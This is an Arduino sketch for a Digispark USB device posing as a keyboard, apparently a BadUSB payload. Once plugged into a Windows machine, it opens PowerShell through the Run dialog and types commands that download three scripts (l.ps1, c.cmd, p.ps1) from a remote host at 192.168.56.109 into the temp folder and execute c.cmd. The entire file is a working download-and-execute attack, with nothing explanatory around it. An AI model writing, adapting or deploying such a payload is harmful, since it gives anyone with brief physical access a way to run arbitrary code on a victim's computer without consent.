#include "DigiKeyboard.h"
void setup() {
}
void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile('http://192.168.56.109/l.ps1',\"$env:temp/l.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.56.109/c.cmd',\"$env:temp/c.cmd\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.56.109/p.ps1',\"$env:temp/p.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd $env:temp;./c.cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  for (;;) {
    }
}
